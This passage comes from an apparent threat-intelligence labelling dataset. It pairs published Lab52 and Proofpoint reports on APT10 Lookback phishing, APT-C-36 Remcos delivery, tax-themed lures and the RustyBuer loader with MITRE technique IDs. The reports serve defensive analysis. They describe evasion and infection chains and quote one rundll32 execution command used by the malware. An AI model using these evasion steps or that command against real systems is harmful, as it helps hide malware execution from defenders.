delivery was a fake invitation to carry out the exam to get the Global Energy Certification ([2]):\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-11.png)\n*Illustration 4. Spear phishing email body*\nThe domain globalenergycertification[.]Net resolves to this IP 79.141.169[.]3.\nIn the following chart there are the domains and IPs which were hosted with their respective date and impersonated entity records:\n| **IP**          | **Domain**                     | **Dates Registered**         | **Impersonated entity**                                  |\n|  79.141.169[.3  | globalenergycertification [.net| August 1 \u2013 September 19, 2019| Global Energy Certification (\u201cGEC\u201d)                      |\n| 103.253.41 [.75 | globalenergycertification [.net| June 12 \u2013 July 30, 2019      | Global Energy Certification (\u201cGEC\u201d)                      |\n|  79.141.168[.137| nceess [.com                   | June 24 \u2013 September 19, 2019 | National Council of Examiners for engineering and Survey |\n| 103.253.41[.75  | nceess [.com                   | May 29 \u2013 June 19, 2019       | National Council of Examiners for engineering and Survey |\nIt has been identified that Lookback samples use the same C&C 103.253.41 [.45.\nIn the MISP (Malware Information Sharing Platform) is showed the IPs shared and the domain associated to both malicious campaigns:\u00a0\n![](https://lab52.io/blog/wp-content/uploads/2020/02/image-12.png)\n*Illustration 5. MISP graphic*\nCONCLUSIONS\nA rise of malicious campaigns against the critical infrastructure or even energy sector has been detected.\nThis sector can be decisive for the progress of large economies such as China, the US and the main suppliers of the Middle East energy sector.\nThe instability in the Middle East\u2019s energy sector and the protectionist policies of certain governments are increasing the geopolitical risk and could increase the China\u2019s concern about its own energy supply.\nThe malicious campaign showed before was carried out in 2019.\nHowever, the geopolitical tension is getting higher in the Middle East, so it would be possible that more malicious campaigns will come to acquire confidential information for spying purposes.\nREFERENCES\n[1] Proofpoint.Lookback and United States. <https://www.proofpoint.com/us/threat-insight/post/lookback-forges-ahead-continued-targeting-united-states-utilities-sector-reveals>\n[2] Proofpoint.Lookback malware. <https://www.proofpoint.com/us/threat-insight/post/lookback-malware-targets-united-states-utilities-sector-phishing-attacks>\n[3] Schroders.2019 Global market prespective. <https://www.schroders.com/en/sysglobalassets/digital/insights/2019/pdfs/q3-2019-global-market-perspective-261959.pdf>\n[4] NBR.Securing belt and road 2019. [https://www.nbr.org/wpcontent/uploads/pdfs/publications/sr80\\_securing\\_the\\_belt\\_and\\_road\\_sep2019.pdf] (https://www.nbr.org/wp%20content%20/%20uploads%20/%20pdfs%20/%20publications%20/%20sr80_securing_the_belt_and_road_sep2019.pdf)\n[5] CSIS.China grand strategy. <https://csis-prod.s3.amazonaws.com/s3fs-public/publication/190807_China_Grand_Strategy_Final_Full.pdf>\n[6] EIA. <https://www.eia.gov/tools/faqs/faq.php?id=709&t=6>\n[7] World to Export <http://www.worldstopexports.com/top-15-crude-oil-suppliers-to-china/>\n[8] English Al-Arabiya. China geo-economic interest. <https://english.alarabiya.net/en/views/news/middle-east/2018/08/29/China-s-geo-economic-interests-and-Middle-East-energy-industry.html>\n[9] Washington Institute. China and the Middle East. <https://www.washingtoninstitute.org/policy-analysis/view/chinas-middle-east-policy-speak-softly-and-wave-a-large-purse>\n[10] Scrip.Paper Information ID 83914 <http://www.scirp.org/journal/PaperInformation.aspx?PaperID=83914>\n[11] China Power CSIS. <https://chinapower.csis.org/energy-footprint/>\n[12] BBC. <https://www.bbc.com/news/world-middle-east-50995792>\n[13] NBC news. <https://www.nbcnews.com/news/world/u-s-base-iraq-comes-under-attack-missiles-iran-claims-n1112171>\n[14] Energy Government. <https://www.energy.gov/articles/department-energy-statement-chinese-hacking-global-managed-service-providers>\n[15] Cyberscoop. <https://www.cyberscoop.com/chinese-linked-apt10-has-been-active-in-the-philippines-researchers-say/>\n[16] Japan Times. <https://www.japantimes.co.jp/news/2020/01/18/asia-pacific/us-iran-tensions-china-economy/>\n[17] Middle East Monitor. <https://www.middleeastmonitor.com/20200115-is-the-strait-of-hormuz-the-key-to-iran-asserting-its-dominance/>\n[18] Lifars <https://lifars.com/2019/08/apt10-targeting-american-utility-companies/>\n[19] South China Morning Post <https://www.scmp.com/news/china/military/article/3045253/china-and-iran-relationship-built-trade-weapons-and-oil>\n[20] Brown. <https://www.brown.edu/Research/Understanding_the_Iran_Contra_Affair/i-thebeginning.php>\u00a0\u00a0\u00a0\n[21] SIPRI <https://www.sipri.org>\n[22] Atlantic Council.<https://www.atlanticcouncil.org/blogs/menasource/chinas-persian-gulf-strategy-keep-tehran-and-riyadh-content/>", "mitre_ids": ["G0045", "G0045", "S0582", "T1566", "T1566", "T1566", "T1566", "T1059", "T1595", "T1566", "T1566", "S0582"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CE", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE"]}, {"cti_report": "APT-C-36 new anti-detection tricks\nMarch 23, 2020\nLab52 has recently detected an increase in the efforts carried out by APT-C-36 to improve their capabilities to remain undetected by Anti Malware software, using a more complex infection chain than a simple packer, as they have been doing so far.\nThe sample detected using this new detection evasion technique has a name and icon that tries to supplant a PDF document, which is already a common TTP of this group.\n![](https://lab52.io/blog/wp-content/uploads/2020/03/1.png)\nUntil now, these binaries were executables packed with common anti-virus circumvention software, but in this case it is an \u201cSFX\nInstaller\u201d that contains a bunch of files, including some that are simply trash and others that are part of the infection chain:\n![](https://lab52.io/blog/wp-content/uploads/2020/03/2.png)\nWhen these installers are executed, they create a temporary folder on the system, where they dump all the files they contain, and then execute one of them as an \u201cEntry Point\u201d in the execution/infection chain.\nIn this case, it is called gospels.exe:\n![](https://lab52.io/blog/wp-content/uploads/2020/03/3.png)\n![](https://lab52.io/blog/wp-content/uploads/2020/03/4.png)\nThis executable consists of a very small program that simply loads dynamically the library \u201cQuoteworthy.dll\u201d that is near the binary, and calls its exported function \u201cExcluders\u201d, passing as parameters some system APIs resolved by the original executable:\n![](https://lab52.io/blog/wp-content/uploads/2020/03/5.png)\nThe DLL\u2019s Excluders function simply calls two internal functions:\n![](https://lab52.io/blog/wp-content/uploads/2020/03/6.png)\nThe first one (unk\\_6D321170), consists of code that is part of the DLL, and that is in charge of deciphering (with an XOR algorithm) a buffer contained in the .data section of the library.\nInside this buffer, the function ignores out of every 4 bytes (since they are zeros).\nAfter building this buffer, it reserves a memory area with execution permissions and copies there the decoded content.\nThen it creates an array of 7 elements in which it stores the string \u201cBoondoggle\u201d (which corresponds to a binary file inside the temporary folder), 4 numbers, and the pointers to the functions \u201cGetProcAddres\u201d and \u201cGetModuleHandleA\u201d that match with the ones received as parameters by this DLL:\n![](https://lab52.io/blog/wp-content/uploads/2020/03/7.png)\n![](https://lab52.io/blog/wp-content/uploads/2020/03/8.png)\nAfter that, the first function of this DLL ends and calls the second one, which, at this point of the execution, points to the memory area where it was written the decoded shellcode, and to which it passes as parameter the before mentioned 7-element array.\nOnce it jumps to that shellcode, using GetProcAddres and GetModuleHandle, it extracts a list of Kernel32 Functions that are \u201chardcoded\u201d:\n![](https://lab52.io/blog/wp-content/uploads/2020/03/9.png)\nIt loads the \u201cBoondoggle\u201d file with the CreateFile API and makes a decode with the same XOR key as before, from which it decodes a new complete executable and a small \u201cPE Loader\u201d that allows it to load the executable into memory using the technique known as \u201cReflectivePEInjection\u201d either in the process itself or in a remote process.\nAfter this, it runs the decrypted binary, which repeats the same logic over another section of the \u201cBoondoggle\u201d from which it extracts a second executable, this time consisting of a copy of the \u201cOllyDBG\u201d plug-in called \u201cOllyDBG PE Dumper\u201d which contains overwritten malicious code that is called.\n![](https://lab52.io/blog/wp-content/uploads/2020/03/10.png)\nThis dll extracts the final threat and in case the initial binary \u201cgospels.exe\u201d had been executed from the installer arriving by mail, it has been observed that it is injected in a legitimate new process \u201ccmd.exe\u201d.\nOn the other hand, in case it is loaded through its persistence in the registry, it is injected in the process \u201cgospels.exe\u201d itself.\nAn interesting point of this stage of infection is that it tries to remove a file called \u201cturpitude.exe\u201d that should be located in the user\u2019s %APPDATA% folder, but no trace has been observed at any point of the analysis, thus it could be an attempt to clean up tools from previous campaigns of this group, although it has not been able to confirm this fact through the analysis of the threat.\nEventually, the final threat remains completely deployed in the memory of the machine, which in this case consists on the \u201cRemcos\u201d remote acces trojan.\n![](https://lab52.io/blog/wp-content/uploads/2020/03/11.png)\nThis threat contacts the command and control domain \u201cpruebaremc.]duckdns.org\u201d through port \u201c1010\u201d.\nIOCS:\n| SHA256 |  E03903AFC4DC4A9DEEDF5442B6D1C8319194F57F1D7620A9C4EBC7D61C436B70  |\n| DNS |  pruebaremc.duckdns.]org  |", "mitre_ids": ["G0099", "G0099", "T1027", "T1027", "TA0002", "T1074", "T1204", "T1055", "T1140", "T1140", "T1620", "T1059", "T1059", "T1140", "T1055", "T1140", "T1140", "T1055", "T1566", "T1112", "T1055", "T1070", "S0332"], "anno_name_label": [], "cti_entity_class": ["CE", "CE", "CI", "CI", "CE", "CI", "CI", "CI", "CI", "CI", "CI", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CI", "CE", "CE", "CE", "CE"]}, {"cti_report": "China: From culture to conflict in the cyberspace\nApril 14, 2020\nSince in 2013 the US cybersecurity consultancy Mandiant published its famous report about APT1, showing its links with different agencies presumably associated with the Chinese government, the news about its actions in cyberspace has been significantly increased.\nAmong others, we find APT15, APT27 or Winnti Group (APT41); the US DoJ\u2019s allegations of cyber espionage towards five Chinese military members associated with the APT1 group; the links that the FBI has established between Zhu Hua and Zhang Shilong and APT10; or the alleged link of PLA unit 61398 (People\u2019s Liberations Army) with APT1.\nWith the permission of Russia and its popular operation against the DNC, China has become the main actor in cyberspace, developing an uncountable number of operations against all kind of sectors as: IT, military or naval industries and different governmental organizations.\nSometimes using more sophisticated malware, and sometimes less, but more and more with its own seal linked to its extensive tradition.\nAccording to traditional ancient texts, Chinese civilization dates back more than 4,000 years with the first Xia dynasty.\nDue to the continuity and strength of its political and social structure, the protection of its historical and cultural legacy and the practically null western influence until the 19th century, the Chinese Empire is considered the oldest empire that exists.\nThe historical endurance of the Chinese empire has not been based solely on military victories, but on its peculiar way of understanding resistance to foreign invasion.\nAs an example, the Qing Dynasty, the last Chinese dynasty that ruled between 1644 and 1912, was founded by the Aisin-Gioro clan of Manchuria (the Manchus are currently an ethnic minority) and not by the Chinese population as it could be though.\nSimilarly, the Yuan dynasty (1279-1368) was founded by Mongol invaders, heirs to the legacy of Genghis Khan.\nDespite this, the language, customs and tradition remained unchanged thanks to the Chinese bureaucratic elites, who offered their services to the invaders with the excuse of the difficulty that would supposed to control a country with such dimensions, and making the only condition to maintain their methods and language.\nBecause of this, the second-generation of invaders would assimilate the culture, coming to be seen as outsiders by their home territories, and finally, ending up defending China\u2019s national interests.\n![](https://lab52.io/blog/wp-content/uploads/2020/04/mountain-3022908_1920-1024x682.jpg)\nThe resistance and adaptability typical of the Chinese character towards the invader is still present, and we have witnessed the transformation of a society that in 1984 was fundamentally agricultural (40% of its GDP), and that just 35 years later dominates the technological world scenario with to the United States as well, leading the deployment of 5G by the hand of Huawei.\nSuch achievement has occurred not only in terms of competitiveness, but also by making its technology an intrinsic part of its legacy and by putting technological development at the service of the national interest.\nAs the comparison mentioned by the former head of the Canadian Intelligence and Security Service for Asia-Pacific, Michel Juneau-Katsua, if Western intelligence had to steal a beach, he would go at night and wait for nobody to see him to steal it.\nOn the other hand, if Chinese intelligence had to do it, it would send a thousand tourists and on the way back they would shake their towels, day by day.\nHiding in broad daylight is a concept associated with Eastern culture, because, even leaving aside large corporations such as Xiaomi or Huawei and the obvious possibility of controlling \u201ctheir\u201d devices, they have managed to install software of all kind on any computer on the planet.\nIt is not uncommon to find binaries with Mandarin language resources or drivers signed by Chinese companies, which could potentially facilitate a campaign directed against any organization.\nWe also have the issue of electronic devices, the global massive sale which has allowed the worldwide deployment of a potentially vulnerable network of video surveillance cameras, loudspeakers or smartbands.\nMeanwhile, it competes with Google and Amazon for the control of the information at home.\nHowever, China is not interested in entering the Thucydides trap through a direct confrontation against the United States, but will use, as it has done in the past, the multipolar geopolitical scenario to achieve its purposes.\n*If you use the enemy to defeat the enemy, you will be powerful wherever you go.*\nAbout to end the Korean War, Mao managed to gain a foothold on the international scene through a strategy very much in the line with the classic strategist Sun Tzu.\nIn a world in which two great superpowers, the United States and the Soviet Union, fought for world hegemony, he managed to see them as equals.\nIt faced the United States in the Taiwan Strait conflict and, almost at the same time, ideologically and geopolitically dissociated itself from the communist bloc.\nThis position was based on the fact that none of the powers would allow the launching of nuclear weapons on Mandarin territory, and the maintenance of a public position that claimed to have no fear of such weapons.\nAs Mao himself stated, \u201cChina has 600 million inhabitants in an area of \u200b\u200b9.6 million square kilometers.\nThe United States cannot annihilate China with a simple pile of atomic bombs.\n\u201c Exercising an active position, Mao ended up being part of the international balance with an independent voice, exerting psychological pressure on both sides through the conflicts in the Taiwan Strait and his intervention in the Vietnam War.\nThe current world offers very good opportunities for these puppeteer performances, as the attribution of a hostile act in cyberspace is truly complex, as evidenced by the false flag operation reported by Kaspersky on OlympicDestroyer.\nDuring the 2018 South Korea Winter Olympics, the OlympicDestroyer malware paralyzed IT systems, caused outages, and brought down the organization\u2019s websites.\nWhat is relevant about these actions is that, as detailed in the report, the tactics, techniques and procedures (TTP) were those commonly used by the Lazarous group, associated with North Korea.\nHowever, everything indicated that intentional errors had been made in order to facilitate the detection of such TTPs, stirring the international stage with a campaign with mediatic overtones.\nThis makes more sense if we take into account that in February 2018 North Korea was surrounded by sanctions derived from its nuclear plan, specifically resolutions 2371, 2375 and 2397 adopted in 2017, which fundamentally damaged its relationship with China.\nLooking to the future, everything indicates that China will continue to bet on conflict resolution through operations in cyberspace, limiting its military interventions to what is strictly necessary or for propaganda purposes.\nThe conflict in cyberspace allows, to a certain extent, to abandon Clausewitz\u2019s theses and the understanding of confrontation as battles that begin and end, and where the enemies are defined and tangible units.\nThe new era embraces Suntzunian theses, promoting flexibility in battle or the use of time as a weapon, concepts that are rather foreign to Western tradition.\nWhile tradition in the West has fostered heroism and the coup in the decisive moment, Chinese ideals are based on patience, subtle harm and the accumulation of advantages in a gradual way, concepts that matches perfectly in a conflict in Internet.\nThus, China is comfortable with the new approach to the multinational conflict, a world whose rules play in favor of concealment, indefiniteness and confusion.\nActually, its rules.\nReferences\n<https://www.fireeye.com/blog/threat-research/2013/02/mandiant-exposes-apt1-chinas-cyber-espionage-units.html>\n<https://www.elmundo.es/internacional/2015/11/25/5654c172268e3eaa7e8b460f.html>\nOn China \u2013Henry Kissinger Principles of War for Cyberspace \u2013 Steven E. Cahanin\n<https://www.kaspersky.com/about/press-releases/2018_the-olympic-false-flag>", "mitre_ids": ["G0006", "G0004", "G0096", "G0006", "G0045", "G0006", "G0045", "T1499", "G0032"], "anno_name_label": [["GROUP", "Emissary Panda"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE"]}, {"cti_report": "Security Brief: Threat Actors Pair Tax-Themed Lures With COVID-19, Healthcare Themes\nApril 15, 2021\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n.node-blog-full .blog-content img {\nborder: 1px solid #000 !important;\n}\n/*--><!]]]]]]><![CDATA[><![CDATA[>*/\n/*--><!]]]]><![CDATA[>*/\n/*--><!]]>*/\nOn 30 March 2021, the United States Internal Revenue Service (IRS) [issued](https://www.irs.gov/newsroom/irs-warns-university-students-and-staff-of-impersonation-email-scam) a security alert detailing an ongoing email-based IRS impersonation campaign primarily targeting educational institutions.\nImpacted people included university and college students and staffers using \u201c.edu\u201d email addresses.\nEducational institutions are not the only organizations that financially motivated threat actors have set their sights on using tax-themed lures.\nProofpoint observed similar threats impacting dozens of verticals from manufacturing to healthcare to energy.\nBut this year is a bit different.\nThreat actors take advantage of every tax season by mounting tax-themed campaigns that aim to steal money and sensitive information.\nWhat makes 2021 unique are the continuing and unprecedented pandemic, healthcare, and financial crises that these threat actors are combining with typical tax lures in the ongoing campaigns Proofpoint observed.\nThese findings demonstrate threat actors are agile and flexible and take current events into account in their campaign development to maximize their advantage and encourage victims to fall for their tactics.\nProofpoint observed over 30 tax-themed malicious email campaigns totaling over 800,000 email messages so far in 2021.\nThese include attempts to compromise personal email accounts or steal sensitive personal data for likely financial gain.\nProofpoint also observed multiple campaigns aligned with [business email compromise](https://www.proofpoint.com/us/threat-reference/business-email-compromise) activities.\nSuch attacks can be used to facilitate payroll fraud, costing victim organizations millions of dollars.\n**Campaign Trends**\nSo far in 2021, Proofpoint identified over 30 discrete campaigns targeting thousands of people from multiple threat actors that leveraged malicious email lures associated with taxes, tax and refund support, and government revenue entities.\nAt least four threat actor groups tracked by Proofpoint have leveraged tax-themed malicious email campaigns.\nCredential theft phishing attempts \u2013 which can be used to target individuals or leveraged for email account takeovers \u2013 accounted for 40% of the tax-themed email campaigns, followed by remote access trojan ([RAT](https://www.proofpoint.com/us/threat-insight/post/threat-insight-2019-review-year-rat)) campaigns at 17%.\nHowever, despite RATs featuring in fewer campaigns, they were far more popular in total message volume.\nHalf of identified tax-themed and related messages containing [malware](https://www.proofpoint.com/us/threat-reference/malware) were used to distribute the Remcos RAT, a commodity malware with extensive data theft and surveillance capabilities.\nOther broad tax-themed malware distribution campaigns included Dridex, TrickBot, and ZLoader.\nOver the course of 2020, threat actors began [increasingly](https://www.csoonline.com/article/3597913/why-excel-4-0-macro-exploits-are-surging.html) leveraging Excel 4.0 (XL4) macros to distribute malware, and this trend has continued in 2021.\nProofpoint observed a 500% increase in tax-themed email threat campaigns delivering weaponized XL4 Macros in the first three months of 2021.\nProofpoint assesses this is due to limited detection coverage in modern security systems.\n(Although Microsoft still supports XL4 macros, the company [suggests](https://support.microsoft.com/en-us/office/working-with-excel-4-0-macros-ba8924d4-e157-4bb2-8d76-2c07ff02e0b8) migrating them to the latest version of Microsoft Visual Basic Application.\n**Campaign Samples**\n**TrickBot**\nOne of the most prolific IRS-themed malware campaigns leveraged IRS tax credit distribution for employee retention lures benefiting employers impacted by COVID-19.\nThis campaign identified in March 2021 contained over 18,000 messages to over 2,000 target entities.\nIt distributed the TrickBot banking trojan.\nTrickBot is designed to steal banking information and acts as an initial payload for additional malware, gaining notoriety in 2018 for distributing Ryuk ransomware which [reportedly](https://www.securitymagazine.com/articles/93769-ryuk-ransomware-responsible-for-one-third-of-all-ransomware-attacks-in-2020) accounted for a third of [ransomware](https://www.proofpoint.com/us/threat-reference/ransomware) distributed by many actors across the threat landscape in 2020.\n![Tax_1](/sites/default/files/inline-images/Tax_1.png)\n*Figure 1: IRS Themed Lure offering an Employ Retention Credit*\nUnlike typically observed activity, this TrickBot campaign distributed malicious Excel files leveraging the XLSB filetype, a lightweight file format that can only be opened in Excel.\nProofpoint assesses with moderate confidence the threat actor leveraged this document format as it is less likely to be detected by anti-virus systems.\nResearchers [previously observed](https://www.hornetsecurity.com/en/threat-research/qakbot-distributed-by-xlsb-files/) the multipurpose trojan QBot distributed via XLSB files in October 2020.\n**Dridex**\nThe threat actor Proofpoint tracks as TA575 [distributed](https://www.proofpoint.com/us/blog/security-briefs/threat-actors-target-victims-promising-covid-19-relief-vaccines-and-variant) emails purporting to be from IRS representatives associated with the [American Rescue Plan](https://www.congress.gov/bill/117th-congress/house-bill/1319/text).\nThe emails contained links to download Microsoft Excel documents containing macros that, when enabled, downloaded the Dridex malware designed to steal banking and other personal information.\nAlso known as the COVID-19 Stimulus Package, the American Rescue Plan, was signed into law on 11 March 2021.\nThe $1.9 trillion economic stimulus package aimed to provide financial relief to people and businesses in the U.S.\n![Tax_2](/sites/default/files/inline-images/Tax_2.png)\n*Figure 2: IRS Rescue Plan Lure*\nThe TA575 campaign, which began in early March, included almost 16,000 messages and impacted over 1,800 organizations across dozens of verticals.\n**Consumer Credential Phishing**\nTax-themed phishing attacks also occur globally, and one campaign Proofpoint identified posed as the United Kingdom\u2019s tax and customs authority, HM Revenue and Customs (HMRC).\nAs part of the country\u2019s COVID-19 response, HMRC [introduced](https://www.gov.uk/government/publications/self-employment-income-support-scheme-grant-extension/self-employment-income-support-scheme-grant-extension) multiple Self-Employment Income Support Schemes allowing people financially impacted by the pandemic to claim financial aid.\nThe malicious email campaign that began in mid-February 2021 distributed messages with links that led to a fake Self-Employment HMRC tax themed authentication page designed to harvest user credentials.\n![Tax_3](/sites/default/files/inline-images/Tax_3.png)\n*Figure 3: Her Majesty's Revenue and Customs Tax Refund Notification Lure*\n**TA574**\nTypical IRS-themed lures remain popular.\nThe cybercrime actor TA574 sent almost 40,000 messages in one campaign using lures posing as the IRS and financial representatives.\nTA574 is an actor operating at a large scale that indiscriminately targets multiple industries and attempts to deliver and install malware like banking trojans.\nThe IRS-themed emails contained malicious Microsoft Excel documents that requested victims enable macros to view content, thereby downloading and executing the [ZLoader](https://www.proofpoint.com/us/blog/threat-insight/zloader-loads-again-new-zloader-variant-returns) malware on a victim machine.\nZLoader is a typical banking malware that steals credentials and other\u00a0private information\u00a0from users of targeted financial institutions.\n![Tax_4](/sites/default/files/inline-images/Tax_4.png)\n*Figure 4: Internal Revenue Service Fake Case*\n**New Client Tax Lures**\nOne small campaign identified in March 2021 leverages subjects purporting to be requests from new clients or tax filing assistance.\nThe emails begin with a benign request for tax preparation assistance from \"John Stevens\" and his wife.\nThe emails target financial and accounting organizations in North America.\nIf the recipient replies, they then receive a follow up email with a URL linking to a document that uses macros to drop a downloader that pulls in NetWire RAT.\nNetWire is typically used by criminal threat actors targeting a wide range of organizations including financial services, businesses, medical companies, and educational institutions.\n![Tax_5](/sites/default/files/inline-images/Tax_5.png)\n*Figure 5: Phishing themes matching previous tax-themes campaigns distributing malware.*\nProofpoint researchers observed [similar campaigns](https://www.proofpoint.com/us/threat-insight/post/tax-themed-email-campaigns-steal-credentials-spread-banking-trojans-rats-ransomware) since 2018.\nProofpoint assesses with high confidence the same threat actor is responsible for these campaigns.\nThis actor targets accounting, financial, and related industries typically around tax season.\n**Conclusion**\nTax season is a popular time for threat actors to conduct email-based attack campaigns designed to steal sensitive information for financial gain.\nIn 2021, threat actors are often combining current events such as COVID-19 or healthcare themes alongside typical tax lures to further entice victims.\nTo reduce the risk of successful exploitation, Proofpoint recommends the following:\n* **Train users to spot and report malicious email**.\nRegular training and simulated attacks can stop many attacks and help identify people who are especially vulnerable.\nThe best simulations mimic real-world attack techniques.\nLook for solutions that tie into real-world attack trends and the latest threat intelligence.\n* **At the same time, assume that users will eventually click some threats**.\nAttackers will always find new ways to exploit human nature.\nFind a solution that spots and blocks inbound email threats targeting employees before they reach the inbox.\nInvest in a solution can manage the entire spectrum of email threats, not just malware-based threats.\nSome threats\u2014including business email compromise (BEC) and other forms of email fraud\u2014can be hard to detect with conventional security tools.\nYour solution should analyze both external and internal email\u2014attackers may use compromised accounts to trick users within the same organization.\nWeb isolation can be a critical safeguard for unknows and risky URLs.\n* **Manage access to sensitive data and insider threats.** A cloud access security broker can help secure cloud accounts and help you grant the right levels of access to users and third-party add-on apps based on the risk factors that matter to you.\nInsider risk management platforms can help protect against insider threats, including users compromised by external attacks.\n* **Partner with a threat intelligence vendor**.\nFocused, targeted attacks call for advanced threat intelligence.\nLeverage a solution that combines static and dynamic techniques at scale to detect new attack tools, tactics, and targets\u2014and then learns from them.", "mitre_ids": ["T1566", "T1566", "TA0006", "S0332", "S0384", "S0183", "T1059", "T1566", "T1059", "T1059", "T1059", "S0183", "S0183", "S0183", "S0446", "T1486", "T1486", "T1486", "T1566", "T1059", "S0384", "T1566", "T1204", "T1105", "T1059", "T1566", "T1566", "T1566", "T1059", "T1204", "TA0006", "T1566", "T1566", "T1105", "S0198", "T1566", "T1566", "T1566"], "anno_name_label": [["MALWARE", "Zloader"], ["MALWARE", "QBot"], ["GROUP", "TA575"], ["GROUP", "TA575"], ["GROUP", "TA574"], ["GROUP", "TA574"], ["GROUP", "TA574"], ["MALWARE", "Zloader"], ["MALWARE", "Zloader"]], "cti_entity_class": ["CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CI", "CI", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE", "CE"]}, {"cti_report": "New Variant of Buer Loader Written in Rust\nMay 03, 2021\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n<!--/*--><![CDATA[/* ><!--*/\n.node-blog-full .blog-content img {\nborder: 1px solid #000 !important;\n}\n/*--><!]]]]]]><![CDATA[><![CDATA[>*/\n/*--><!]]]]><![CDATA[>*/\n/*--><!]]>*/\n**Overview**\nProofpoint researchers identified a new variant of the Buer malware loader distributed via emails masquerading as shipping notices in early April.\n[Buer](https://malpedia.caad.fkie.fraunhofer.de/details/win.buer) is a downloader sold on underground marketplaces that is used as a foothold in compromised networks to distribute other malware, [including ransomware](https://www.cert.ssi.gouv.fr/uploads/CERTFR-2021-CTI-006.pdf).\nProofpoint first [observed Buer in 2019](https://www.proofpoint.com/us/threat-insight/post/buer-new-loader-emerges-underground-marketplace).\nIn the associated campaigns, the emails purported to be from DHL Support.\nThey contained a link to a malicious Microsoft Word or Excel document download that used macros to drop the new malware variant.\nProofpoint is calling this new variant RustyBuer.\nThe emails impacted over 200 organizations across more than 50 verticals.\nThe new strain is completely rewritten in a coding language called Rust, a departure from the previous C programming language.\nIt is unusual to see common malware written in a completely different way.\n**Key Findings**\n* The new Buer variant is written in Rust, an efficient and easy-to-use programming language that is becoming increasingly popular.\nProofpoint is calling this variant RustyBuer.\n* Rewriting the malware in Rust enables the threat actor to better evade existing Buer detection capabilities.\n* Proofpoint observed RustyBuer campaigns delivering Cobalt Strike Beacon as a second-stage payload in some campaigns.\n* Researchers assess some threat actors may be establishing a foothold with the Buer loader to then sell access to other threat actors.\nThis is known as \u201caccess-as-a-service.\n**Campaign Details**\nProofpoint analysts observed a series of malicious campaigns that delivered the Buer malware loader.\nThe campaigns generally used DHL-themed phishing emails to distribute malicious Word or Excel documents.\nWhile sharing similar email lure themes, the campaigns distributed two distinct variants of the Buer malware: one was written in C while the other was rewritten in the Rust programming language.\nProofpoint dubbed this variant RustyBuer.\nThe campaigns also used different lure techniques, with RustyBuer attachments containing more detailed content to better engage the recipient.\nThe rewritten malware, and the use of newer lures attempting to appear more legitimate, suggest threat actors leveraging RustyBuer are evolving techniques in multiple ways to both evade detection and attempt to increase successful click rates.\n![Rusty_1](/sites/default/files/inline-images/Rusty_1.png)\nFigure 1: Emails masquerading as DHL shipping themes used to distribute RustyBuer and Buer loaders.\n![Rusty_2](/sites/default/files/inline-images/Rusty_2.png)\nFigure 2: Malicious Excel attachment distributing RustyBuer containing multiple security software brand logos in an attempt to add legitimacy to the document.\nRustyBuer was embedded directly into the document macro and required user interaction to initiate the infection.\nThis macro leveraged an Application Bypass (Windows Shell DLL via [LOLBAS](https://lolbas-project.github.io/lolbas/Libraries/Shell32/)) to evade detection from endpoint security mechanisms.\n**Example Script execution:**\nrundll32.exe shell32.dll,ShellExec\\_RunDLL C:\\ProgramData\\OfficeSignCheck.exe\nOnce RustyBuer is dropped, it establishes persistence by using a shortcut (.LNK) file which runs at startup.\nAll the identified campaigns used consistent naming conventions following the inclusion of \u201cOffice\u201d in the dropped executable.\nBoth the Rust and C versions of the malware followed this same pattern including:\n1. OfficeVerifySign.exe (**3abed86f46c8be754239f8c878f035efaae91c33b8eb8818c5bbed98c4d9a3ac**)\n2. Office\\_WorkForWestBank.exe (**423790a4a722f3549d1dfc1026fa627d829c6dd8c26546d45f2ca4b6d6626acb**)\n3. OfficeReleaseFix.exe (**b3d510ef04275ca8e698e5b3cbb0ece3949ef9252f0cdc839e9ee347409a2209**)\n4. OfficeConsultPlugin.exe (sha256:**b3d510ef04275ca8e698e5b3cbb0ece3949ef9252f0cdc839e9ee347409a2209**)\nProofpoint researchers observed RustyBuer distributing Cobalt Strike Beacon as a second-stage payload in some instances, like previous Buer campaigns.\nCobalt Strike is a legitimate security tool used by penetration testers to emulate adversary activity in a network that is becoming increasingly popular as a tool for threat actors.\nHowever, not all identified campaigns contained a second-stage payload.\nResearchers assess this may be due to threat actors in some specific instances operating as access-as-a-service providers.\nThese threat actors may be attempting to establish initial access in victim environments to then sell their access to other threat actors in underground marketplaces.\nOther security firms have [documented this behavior](https://news.sophos.com/en-us/2020/10/28/hacks-for-sale-inside-the-buer-loader-malware-as-a-service/) from threat actors using Buer loader previously.\n**Malware Analysis**\nProofpoint classified the new variant of Buer (RustyBuer) as a rewritten version in Rust based on present anti-analysis features, strings, and encoding and format of the command and control (C2) requests.\nIt is unclear why the threat actors took the time and effort to rewrite the malware in a new programming language, however Proofpoint researchers identify two likely reasons:\n1. Rust is an increasingly popular programming language that is more efficient and has a broader feature set than C. (Microsoft, for example, is [increasingly](https://www.zdnet.com/article/microsoft-why-we-used-programming-language-rust-over-go-for-webassembly-on-kubernetes-app/) using it in its products and [joined](https://cloudblogs.microsoft.com/opensource/2021/02/08/microsoft-joins-rust-foundation/) the Rust Foundation in February 2021.\n2. Rewriting the malware in Rust can enable the threat actor to evade existing Buer detections that are based on features of the malware written in C.\nThe malware authors have programmed it in a way that it should maintain compatibility with existing Buer backend C2 servers and panels.\n![Rusty_3](/sites/default/files/inline-images/Rusty_3.png)\nFigure 3: Example of select Rust dependencies\nThe following is a detailed analysis of the new variant.\nAnti-analysis features\n* Checks for virtual machines (Figure 7)\n* Checks locale to make sure the malware is not running in specific countries (Figure 8).\nThese countries appear to be a part of the Commonwealth of Independent States (CIS).\n![Rusty_4](/sites/default/files/inline-images/Rusty_4.png)\nFigure 4: Virtual machine checks\n![Rusty_5](/sites/default/files/inline-images/Rusty_5.png)\nFigure 5: Locale check\n**Command and Control**\nThe C2 requests are nearly 